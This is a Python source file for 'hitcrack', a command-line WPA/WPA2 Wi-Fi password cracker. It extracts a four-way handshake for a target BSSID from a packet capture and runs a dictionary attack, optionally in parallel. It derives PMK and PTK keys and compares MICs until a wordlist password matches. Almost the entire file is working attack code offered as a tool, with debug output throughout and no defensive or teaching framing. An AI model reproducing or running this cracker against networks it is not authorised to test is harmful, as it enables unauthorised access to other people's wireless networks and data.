#!/usr/bin/env python3
# PYTHON_ARGCOMPLETE_OK

import sys
import time
import multiprocessing as mp
from multiprocessing import Pool
import hashlib
import hmac
from scapy.all import rdpcap, EAPOL, Dot11, Raw, LLC, SNAP, wrpcap
import argparse

class WPACracker:

    def __init__(self, cap_file, wordlist, bssid, output_file=None, processes=1):
        self.cap_file = cap_file
        self.wordlist = wordlist
        self.target_bssid = bssid.upper().replace("-", ":")
        self.output_file = output_file
        self.handshake_data = None
        self.passwords_tested = 0
        self.start_time = None
        if processes == 0:
            self.num_processes = mp.cpu_count()
            print(f"[*] Configured to use multi-processing-mode")
        else:
            self.num_processes = 1
            print(f"[*] Configured to use single-process mode")

    def load_capture(self):
        """Load and parse the capture file"""
        try:
            print(f"[*] Loading capture file: {self.cap_file}")
            self.packets = rdpcap(self.cap_file)
            print(f"[+] Loaded {len(self.packets)} packets")
            return True
        except Exception as e:
            print(f"[-] Error loading capture: {e}")
            return False

    def is_eapol_packet(self, pkt):
        """Check if packet is an EAPOL packet (more robust detection)"""

        if pkt.haslayer(EAPOL):
            return True

        if pkt.haslayer(SNAP):
            snap = pkt[SNAP]
            if snap.code == 0x888E:
                return True

        if pkt.haslayer(Raw):
            raw_data = bytes(pkt[Raw])

            if len(raw_data) > 4 and raw_data[0] == 0x01 and raw_data[1] == 0x03:
                return True

        return False

    def extract_eapol_data(self, pkt):
        """Extract EAPOL data from packet"""

        if pkt.haslayer(EAPOL):
            eapol = pkt[EAPOL]
            if hasattr(eapol, "load"):
                return bytes(eapol.load)
            return bytes(eapol)

        if pkt.haslayer(SNAP) and pkt.haslayer(Raw):
            raw_data = bytes(pkt[Raw])

            if len(raw_data) >= 4:
                return raw_data[4:]

        return None

    def get_message_type(self, pkt):
        """Determine EAPOL message type (1-4)"""
        print(f"[DEBUG get_message_type] Called")

        if not self.is_eapol_packet(pkt):
            print(f"[DEBUG get_message_type] Not EAPOL packet")
            return 0

        print(f"[DEBUG get_message_type] Is EAPOL packet")

        try:

            if not pkt.haslayer(Raw):
                print(f"[DEBUG get_message_type] No Raw layer")

                if pkt.haslayer(EAPOL):
                    print(f"[DEBUG get_message_type] Has EAPOL layer, trying that")
                    raw_data = bytes(pkt[EAPOL])
                else:
                    return 0
            else:
                raw_data = bytes(pkt[Raw])
                print(f"[DEBUG get_message_type] Got Raw data, length: {len(raw_data)}")

            print(
                f"[DEBUG get_message_type] First bytes: {raw_data[:min(20, len(raw_data))].hex()}"
            )

            if len(raw_data) < 7:
                print(
                    f"[DEBUG get_message_type] Raw data too short: {len(raw_data)} bytes"
                )
                return 0

            print(
                f"[DEBUG get_message_type] Byte[0]: {raw_data[0]:02x}, Byte[1]: {raw_data[1]:02x}"
            )

            if raw_data[1] != 0x03:
                print(
                    f"[DEBUG get_message_type] Not EAPOL-Key, type: {raw_data[1]:02x}"
                )
                return 0

            key_info = int.from_bytes(raw_data[5:7], byteorder="big")

            print(f"[DEBUG get_message_type] Key Info: 0x{key_info:04x}")

            key_ack = bool(key_info & 0x0080)
            key_mic = bool(key_info & 0x0100)
            secure = bool(key_info & 0x0200)
            install = bool(key_info & 0x0040)

            print(
                f"[DEBUG] Flags - ACK:{key_ack}, MIC:{key_mic}, Secure:{secure}, Install:{install}"
            )

            if key_ack and not key_mic:
                print(f"[DEBUG] → Message 1")
                return 1

            elif not key_ack and key_mic and not secure:
                print(f"[DEBUG] → Message 2")
                return 2

            elif key_ack and key_mic and install:
                print(f"[DEBUG] → Message 3")
                return 3

            elif not key_ack and key_mic and secure:
                print(f"[DEBUG] → Message 4")
                return 4

            print(f"[DEBUG] → Unknown message type")

        except Exception as e:
            print(f"[DEBUG] Exception in get_message_type: {e}")
            import traceback

            traceback.print_exc()

        return 0

    def extract_handshake_data(self, pkt, msg_num):
        """Extract critical data from handshake packet"""
        data = {}

        try:

            if pkt.haslayer(Dot11):
                data["ap_mac"] = pkt[Dot11].addr1
                data["client_mac"] = pkt[Dot11].addr2
                data["bssid"] = pkt[Dot11].addr3
            else:
                return data

            data["msg_num"] = msg_num

            eapol_data = self.extract_eapol_data(pkt)
            if not eapol_data:
                return data

            if msg_num == 2:
                print(f"\n[DEBUG] Full EAPOL frame (Message 2): {eapol_data.hex()}")
                print(f"[DEBUG] EAPOL frame length: {len(eapol_data)}")

            if len(eapol_data) >= 49:
                data["nonce"] = eapol_data[17:49]
            else:
                print(
                    f"[DEBUG] EAPOL data too short for nonce: {len(eapol_data)} bytes"
                )
                data["nonce"] = b"\x00" * 32

            if len(eapol_data) >= 97:
                data["mic"] = eapol_data[81:97]
            else:
                print(f"[DEBUG] EAPOL data too short for MIC: {len(eapol_data)} bytes")
                data["mic"] = b"\x00" * 16

            if pkt.haslayer(Raw):
                raw_bytes = bytes(pkt[Raw])
                data["eapol_frame"] = raw_bytes
            else:
                data["eapol_frame"] = eapol_data

            data["packet"] = pkt

            if msg_num == 2:
                print(f"\n[DEBUG extract] Message 2 data:")
                print(f"  AP MAC: {data.get('ap_mac', 'N/A')}")
                print(f"  Client MAC: {data.get('client_mac', 'N/A')}")
                print(f"  BSSID: {data.get('bssid', 'N/A')}")
                print(f"  SNonce length: {len(data.get('nonce', b''))}")
                print(f"  MIC length: {len(data.get('mic', b''))}")
                print(f"  EAPOL frame length: {len(data.get('eapol_frame', b''))}")

        except Exception as e:
            print(f"[-] Error extracting data: {e}")
        return data

    def find_handshake(self):
        """Find and extract valid 4-way handshake for target BSSID"""
        print(f"[*] Searching for handshake with BSSID: {self.target_bssid}")

        print("[*] Analyzing packets...")
        eapol_count = 0
        dot11_count = 0

        for pkt in self.packets:
            if pkt.haslayer(Dot11):
                dot11_count += 1
            if self.is_eapol_packet(pkt):
                eapol_count += 1

        print(f"[+] Found {dot11_count} Dot11 packets")
        print(f"[+] Found {eapol_count} EAPOL packets")

        print("\n[DEBUG] BSSIDs found in EAPOL packets:")
        for pkt in self.packets:
            if self.is_eapol_packet(pkt) and pkt.haslayer(Dot11):
                addr1 = (
                    pkt[Dot11].addr1.upper() if hasattr(pkt[Dot11], "addr1") else "N/A"
                )
                addr2 = (
                    pkt[Dot11].addr2.upper() if hasattr(pkt[Dot11], "addr2") else "N/A"
                )
                addr3 = (
                    pkt[Dot11].addr3.upper() if hasattr(pkt[Dot11], "addr3") else "N/A"
                )
                print(f"  addr1: {addr1}, addr2: {addr2}, addr3: {addr3}")

        eapol_packets = []
        handshake_packets = []
        for pkt in self.packets:
            if self.is_eapol_packet(pkt) and pkt.haslayer(Dot11):
                msg_type = self.get_message_type(pkt)

                addr1 = pkt[Dot11].addr1.upper() if hasattr(pkt[Dot11], "addr1") else ""
                addr2 = pkt[Dot11].addr2.upper() if hasattr(pkt[Dot11], "addr2") else ""
                addr3 = pkt[Dot11].addr3.upper() if hasattr(pkt[Dot11], "addr3") else ""

                print(f"\n[DEBUG] Checking packet - msg_type: {msg_type}")
                print(f"  Target BSSID: {self.target_bssid}")
                print(f"  addr1: {addr1}, addr2: {addr2}, addr3: {addr3}")
                print(f"  Match: {self.target_bssid in (addr1, addr2, addr3)}")

                if msg_type > 0 and self.target_bssid in (addr1, addr2, addr3):
                    data = self.extract_handshake_data(pkt, msg_type)
                    if data:
                        eapol_packets.append(data)
                        handshake_packets.append(pkt)
                        print(f"[+] Found Message {msg_type}")

        if not eapol_packets:
            print("[-] No EAPOL packets found for target BSSID")
            return False

        print(f"[+] Extracted {len(eapol_packets)} EAPOL packets")

        messages = {}
        for pkt_data in eapol_packets:
            msg_num = pkt_data["msg_num"]
            if msg_num not in messages:
                messages[msg_num] = pkt_data

        print(f"[+] Found messages: {sorted(messages.keys())}")

        anonce = None

        anonce = None
        if 1 in messages:
            anonce = messages[1]["nonce"]
            print("[+] Got ANonce from Message 1")
        elif 3 in messages:
            anonce = messages[3]["nonce"]
            print("[+] Got ANonce from Message 3")
        else:
            print("[-] No ANonce found (need Message 1 or 3)")
            return False

        if 2 not in messages:
            print("[-] Missing Message 2 (required for cracking)")
            return False

        msg2 = messages[2]

        self.handshake_data = {
            "ssid": self.extract_ssid(),
            "ap_mac": msg2["ap_mac"].replace(":", "").lower(),
            "client_mac": msg2["client_mac"].replace(":", "").lower(),
            "anonce": anonce,
            "snonce": msg2["nonce"],
            "mic": msg2["mic"],
            "eapol_frame": msg2["eapol_frame"],
        }

        print(f"[+] Handshake captured successfully!")
        print(f"    SSID: {self.handshake_data['ssid']}")
        print(f"    AP MAC: {self.handshake_data['ap_mac']}")
        print(f"    Client MAC: {self.handshake_data['client_mac']}")

        print(f"\n[DEBUG] ANonce: {self.handshake_data['anonce'].hex()}")
        print(f"[DEBUG] SNonce: {self.handshake_data['snonce'].hex()}")
        print(f"[DEBUG] MIC: {self.handshake_data['mic'].hex()}")

        if self.output_file and handshake_packets:
            try:
                wrpcap(self.output_file, handshake_packets)
                print(
                    f"[+] Saved {len(handshake_packets)} handshake packets to {self.output_file}"
                )
            except Exception as e:
                print(f"[-] Failed to save handshake packets: {e}")

        return True

    def extract_ssid(self):
        """Extract SSID from beacon frames"""
        for pkt in self.packets:
            if pkt.haslayer(Dot11):

                if pkt.type == 0 and pkt.subtype == 8:
                    try:
                        if (
                            hasattr(pkt, "addr3")
                            and pkt.addr3.upper() == self.target_bssid
                        ):

                            if hasattr(pkt, "info"):
                                ssid = pkt.info.decode("utf-8", errors="ignore")
                                if ssid:
                                    return ssid
                    except Exception:
                        pass
        return "Unknown"

    @staticmethod
    def pbkdf2_sha1(password, ssid, iterations=4096):
        """
        Derive PMK (Pairwise Master Key) using PBKDF2-HMAC-SHA1
        PMK = PBKDF2(password, ssid, 4096, 256 bits)
        """
        from hashlib import pbkdf2_hmac

        return pbkdf2_hmac(
            "sha1", password.encode("utf-8"), ssid.encode("utf-8"), iterations, 32
        )

    @staticmethod
    def calculate_ptk(pmk, ap_mac, client_mac, anonce, snonce):
        """
        Calculate PTK (Pairwise Transient Key) from PMK
        Using the exact method from the reference code
        """

        ap_mac_bytes = bytes.fromhex(ap_mac)
        client_mac_bytes = bytes.fromhex(client_mac)

        ptk_salt = (
            min(ap_mac_bytes, client_mac_bytes)
            + max(ap_mac_bytes, client_mac_bytes)
            + min(anonce, snonce)
            + max(anonce, snonce)
        )

        pke = b"Pairwise key expansion"
        i = 0
        ptk = b""

        while len(ptk) < 64:
            msg = pke + b"\x00" + ptk_salt + bytes([i])
            hmac_sha1 = hmac.new(pmk, msg, hashlib.sha1)
            i += 1
            ptk += hmac_sha1.digest()

        return ptk[:64]

    @staticmethod
    def verify_mic(ptk, eapol_frame, captured_mic, password=None):
        """
        Verify if the calculated MIC matches the captured MIC
        MIC is calculated using KCK (first 16 bytes of PTK)
        """
        if password:
            print(f"[DEBUG verify_mic] Testing password: '{password}'")

        kck = ptk[:16]

        eapol_for_mic = bytearray(eapol_frame)

        if len(eapol_for_mic) >= 97:
            eapol_for_mic[81:97] = b"\x00" * 16
        else:
            print(f"[DEBUG verify_mic] Frame too short for expected MIC position")
            return False

        calculated_mic = hmac.new(kck, bytes(eapol_for_mic), hashlib.sha1).digest()[:16]

        print(f"[DEBUG verify_mic] Match: {calculated_mic == captured_mic}")

        return calculated_mic == captured_mic

    @staticmethod
    def test_password_worker(password, handshake_data):
        """
        Worker function to test a single password
        This runs in a separate process
        """
        try:
            pmk = WPACracker.pbkdf2_sha1(password, handshake_data["ssid"])

            ptk = WPACracker.calculate_ptk(
                pmk,
                handshake_data["ap_mac"],
                handshake_data["client_mac"],
                handshake_data["anonce"],
                handshake_data["snonce"],
            )

            if WPACracker.verify_mic(
                ptk, handshake_data["eapol_frame"], handshake_data["mic"], password
            ):
                return password

        except Exception:
            pass

        return None

    def test_password(self, password):
        """Test a single password against the handshake"""
        try:
            pmk = WPACracker.pbkdf2_sha1(password, self.handshake_data["ssid"])

            ptk = WPACracker.calculate_ptk(
                pmk,
                self.handshake_data["ap_mac"],
                self.handshake_data["client_mac"],
                self.handshake_data["anonce"],
                self.handshake_data["snonce"],
            )

            if WPACracker.verify_mic(
                ptk,
                self.handshake_data["eapol_frame"],
                self.handshake_data["mic"],
                password,
            ):
                return True

        except Exception as e:
            pass

        return False

    def get_kps(self):
        """Calculate keys per second"""
        if not self.start_time:
            return 0
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            return 0
        return self.passwords_tested / elapsed

    def crack(self):
        """Main cracking function - dictionary attack"""
        if not self.handshake_data:
            print("[-] No valid handshake found")
            return False

        print(f"\n[*] Starting dictionary attack...")
        print(f"[*] Wordlist: {self.wordlist}")

        try:
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                wordlist_lines = f.readlines()

            total_passwords = len(wordlist_lines)
            print(f"[*] Loaded {total_passwords} passwords\n")

        except Exception as e:
            print(f"[-] Error reading wordlist: {e}")
            return False

        self.start_time = time.time()

        for line in wordlist_lines:
            password = line.strip()
            print(f"[DEBUG] Testing: '{password}' (length: {len(password)})")

            if not password or len(password) < 8:
                continue

            self.passwords_tested += 1

            if self.test_password(password):
                print(f"[SUCCESS] Password matched: '{password}'")
                elapsed = time.time() - self.start_time
                print(f"\n{'='*60}")
                print(f"[+] PASSWORD FOUND: {password}")
                print(f"{'='*60}")
                print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                print(f"[+] Passwords tested: {self.passwords_tested}")
                print(f"[+] Average speed: {self.get_kps():.2f} keys/sec")
                return True

            if self.passwords_tested % 10 == 0:
                kps = self.get_kps()
                progress = (self.passwords_tested / total_passwords) * 100
                print(
                    f"\r[*] Testing: {password[:20]:<20} | "
                    f"Tested: {self.passwords_tested}/{total_passwords} ({progress:.1f}%) | "
                    f"Speed: {kps:.2f} keys/sec",
                    end="",
                    flush=True,
                )

        print(f"\n\n[-] Password not found in wordlist")
        print(f"[*] Total passwords tested: {self.passwords_tested}")
        return False

    def crack_parallel(self):
        """Main parallel cracking function using multiprocessing"""
        if not self.handshake_data:
            print("[-] No valid handshake found")
            return False

        print(f"\n[*] Starting PARALLEL dictionary attack...")
        print(f"[*] Wordlist: {self.wordlist}")
        print(f"[*] Using {self.num_processes} CPU cores")

        try:
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [
                    line.strip()
                    for line in f
                    if line.strip() and len(line.strip()) >= 8
                ]

            total_passwords = len(passwords)
            print(f"[*] Loaded {total_passwords} passwords\n")

        except Exception as e:
            print(f"[-] Error reading wordlist: {e}")
            return False

        self.start_time = time.time()

        with Pool(processes=self.num_processes) as pool:
            tasks = [(password, self.handshake_data) for password in passwords]

            print("[*] Cracking in progress...")
            print("-" * 70)

            results_iter = pool.starmap(
                WPACracker.test_password_worker, tasks, chunksize=1
            )

            for i, result in enumerate(results_iter, 1):
                if result is not None:
                    elapsed = time.time() - self.start_time
                    kps = i / elapsed

                    print(f"\n{'='*60}")
                    print(f"[+] PASSWORD FOUND: {result}")
                    print(f"{'='*60}")
                    print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                    print(f"[+] Passwords tested: {i}")
                    print(f"[+] Average speed: {kps:.2f} keys/sec")

                    pool.terminate()
                    pool.join()
                    return True

                if i % 100 == 0:
                    progress = (i / total_passwords) * 100
                    elapsed = time.time() - self.start_time
                    kps = i / elapsed if elapsed > 0 else 0

                    print(
                        f"\r[*] Progress: {i}/{total_passwords} ({progress:.1f}%) | "
                        f"Speed: {kps:.2f} keys/sec | Time: {elapsed:.1f}s",
                        end="",
                        flush=True,
                    )

        elapsed = time.time() - self.start_time
        print(f"\n\n[-] Password not found in wordlist")
        print(f"[*] Total passwords tested: {total_passwords}")
        print(f"[*] Total time: {elapsed:.2f} seconds")
        print(f"[*] Average speed: {total_passwords/elapsed:.2f} keys/sec")
        return False


def main():

    art = r"""
   /$$       /$$   /$$                                            /$$      
| $$      |__/  | $$                                           | $$      
| $$$$$$$  /$$ /$$$$$$    /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$$| $$   /$$
| $$__  $$| $$|_  $$_/   /$$_____/ /$$__  $$|____  $$ /$$_____/| $$  /$$/
| $$  \ $$| $$  | $$    | $$      | $$  \__/ /$$$$$$$| $$      | $$$$$$/ 
| $$  | $$| $$  | $$ /$$| $$      | $$      /$$__  $$| $$      | $$_  $$ 
| $$  | $$| $$  |  $$$$/|  $$$$$$$| $$     |  $$$$$$$|  $$$$$$$| $$ \  $$
|__/  |__/|__/   \___/   \_______/|__/      \_______/ \_______/|__/  \__/
"""

    parser = argparse.ArgumentParser(
        prog="hitcrack",
        description=art
        + "\n\nCapture and analyze WiFi handshakes for WPA/WPA2 cracking",
        epilog="@By NS-Guys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    def add_interface_argument(parser):
        parser.add_argument(
            "-i",
            "--interface",
            help="Network interface (for future live capture)",
            metavar="IFACE",
        )

    add_interface_argument(parser)

    parser.add_argument(
        "-c",
        "--capture",
        required=True,
        help="Path to .cap file containing handshake",
        metavar="FILE",
    )
    parser.add_argument(
        "-w", "--wordlist", required=True, help="Path to wordlist file", metavar="FILE"
    )
    parser.add_argument(
        "-b",
        "--bssid",
        required=True,
        help="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)",
        metavar="BSSID",
    )

    parser.add_argument(
        "-o",
        "--output",
        help="Save handshake packets to .cap file for later use",
        metavar="FILE",
    )

    parser.add_argument(
        "-p",
        "--processes",
        help="Use 0 for max CPU cores (parallel), or 1 for single-process (default)",
        type=int,
        choices=[0, 1],
        default=1,
        metavar="MODE",
    )

    args = parser.parse_args()

    cracker = WPACracker(
        args.capture, args.wordlist, args.bssid, args.output, args.processes
    )

    if not cracker.load_capture():
        sys.exit(1)

    if not cracker.find_handshake():
        print("[-] Failed to find valid handshake")
        sys.exit(1)

    if cracker.num_processes == 1:
        success = cracker.crack()
    else:
        success = cracker.crack_parallel()

    if not success:
        sys.exit(1)


if __name__ == "__main__":
    mp.freeze_support()
    main()
